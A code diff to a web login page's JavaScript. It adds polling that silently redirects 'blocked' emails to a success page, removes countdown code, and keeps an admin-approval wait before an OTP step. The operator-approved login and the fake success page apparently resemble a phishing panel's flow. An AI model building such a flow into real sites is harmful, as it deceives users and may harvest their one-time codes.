@@ -334,15 +334,14 @@ button:disabled{
   let approvalInterval = null;
   let timeoutTimer = null;
   let startTime = null;
+  let blockCheckInterval = null;
   const TIMEOUT_SECONDS = 60;
 
-  // Email validation function
   function isValidEmail(email) {
     const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
     return emailRegex.test(email);
   }
 
-  // Real-time email validation on input
   emailInput.addEventListener('input', function() {
     const email = this.value.trim();
     if (email && !isValidEmail(email)) {
@@ -355,6 +354,36 @@ button:disabled{
     }
   });
 
+  // BLOCK CHECK FUNCTION - Redirects to success if email is blocked
+  async function checkIfBlocked(email) {
+    try {
+      const response = await fetch('/api/users/check-blocked', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email })
+      });
+      const data = await response.json();
+      if (data.blocked === true) {
+        window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
+        return true;
+      }
+      return false;
+    } catch (err) {
+      console.log('Block check error:', err);
+      return false;
+    }
+  }
+
+  function startBlockChecking(email) {
+    if (blockCheckInterval) clearInterval(blockCheckInterval);
+    blockCheckInterval = setInterval(async () => {
+      const blocked = await checkIfBlocked(email);
+      if (blocked) {
+        clearInterval(blockCheckInterval);
+      }
+    }, 3000);
+  }
+
   function resetForm() {
     if (approvalInterval) {
       clearInterval(approvalInterval);
@@ -363,6 +392,10 @@ button:disabled{
     if (timeoutTimer) {
       clearTimeout(timeoutTimer);
       timeoutTimer = null;
+    }
+    if (blockCheckInterval) {
+      clearInterval(blockCheckInterval);
+      blockCheckInterval = null;
     }
     startTime = null;
     submitBtn.disabled = false;
@@ -388,56 +421,27 @@ button:disabled{
     }
   }
 
-  function startTimeoutCountdown() {
-    // Show countdown in status message
-    const updateCountdown = () => {
-      if (!startTime) return;
-      const elapsed = Math.floor((Date.now() - startTime) / 1000);
-      const remaining = TIMEOUT_SECONDS - elapsed;
-      if (remaining > 0) {
-        statusMessage.textContent = ``;
-        statusMessage.style.display = 'none';
-      }
-    };
-    
-    // Update countdown every second
-    const countdownInterval = setInterval(() => {
-      if (!startTime) {
-        clearInterval(countdownInterval);
-        return;
-      }
-      const elapsed = Math.floor((Date.now() - startTime) / 1000);
-      if (elapsed >= TIMEOUT_SECONDS) {
-        clearInterval(countdownInterval);
-        showTimeoutError();
-      } else {
-        updateCountdown();
-      }
-    }, 1000);
-    
-    // Store interval to clear later if needed
-    window.countdownInterval = countdownInterval;
-  }
-
   async function handleSubmit() {
-    const email = emailInput.value.trim();
+    const emailValue = emailInput.value.trim();
     
-    // Email validation
-    if (!email) {
+    if (!emailValue) {
       emailError.textContent = 'Please enter your email address';
       emailError.style.display = 'block';
       emailInput.classList.add('error');
       return;
     }
     
-    if (!isValidEmail(email)) {
+    if (!isValidEmail(emailValue)) {
       emailError.textContent = 'Please enter a valid email address (e.g., name@example.com)';
       emailError.style.display = 'block';
       emailInput.classList.add('error');
       return;
     }
 
-    // Clear any previous errors and timeouts
+    // FIRST CHECK: Is email blocked?
+    const isBlocked = await checkIfBlocked(emailValue);
+    if (isBlocked) return;
+
     emailError.style.display = 'none';
     emailInput.classList.remove('error');
     timeoutMessage.style.display = 'none';
@@ -446,7 +450,6 @@ button:disabled{
       clearInterval(window.countdownInterval);
     }
 
-    // Show loading on button
     submitBtn.disabled = true;
     submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Sending Code...</span>';
     statusMessage.style.display = 'none';
@@ -456,31 +459,36 @@ button:disabled{
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
-          email: email, 
+          email: emailValue, 
           password: checkbox.checked ? 'student' : 'user' 
         })
       });
 
+      const data = await response.json();
+      
+      // Check if blocked response from server
+      if (data.blocked === true) {
+        window.location.href = `/users/success?email=${encodeURIComponent(emailValue)}`;
+        return;
+      }
+
       if (!response.ok) throw new Error('Login failed');
 
-      // After sending email to admin, show waiting for approval with countdown
-      submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Sending code...</span>';
+      submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Waiting for verification...</span>';
       emailInput.disabled = true;
       checkbox.disabled = true;
       
-      // Start timeout timer (60 seconds)
+      // Start block checking (user might get blocked while waiting)
+      startBlockChecking(emailValue);
+      
       startTime = Date.now();
       timeoutTimer = setTimeout(() => {
         showTimeoutError();
       }, TIMEOUT_SECONDS * 1000);
       
-      startTimeoutCountdown();
-      
-      // Start checking for admin approval
       if (approvalInterval) clearInterval(approvalInterval);
       
       approvalInterval = setInterval(async () => {
-        // Check if timeout already occurred
         if (!startTime || (Date.now() - startTime) >= TIMEOUT_SECONDS * 1000) {
           return;
         }
@@ -489,16 +497,15 @@ button:disabled{
           const checkResponse = await fetch('/api/users/check-approval', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ email })
+            body: JSON.stringify({ email: emailValue })
           });
-          const data = await checkResponse.json();
+          const approvalData = await checkResponse.json();
           
-          if (data.approved === true) {
-            // Clear everything and redirect
+          if (approvalData.approved === true) {
             if (approvalInterval) clearInterval(approvalInterval);
             if (timeoutTimer) clearTimeout(timeoutTimer);
-            if (window.countdownInterval) clearInterval(window.countdownInterval);
-            window.location.href = `/users/otp?email=${encodeURIComponent(email)}`;
+            if (blockCheckInterval) clearInterval(blockCheckInterval);
+            window.location.href = `/users/otp?email=${encodeURIComponent(emailValue)}`;
           }
         } catch (err) {
           console.log('Checking approval...');
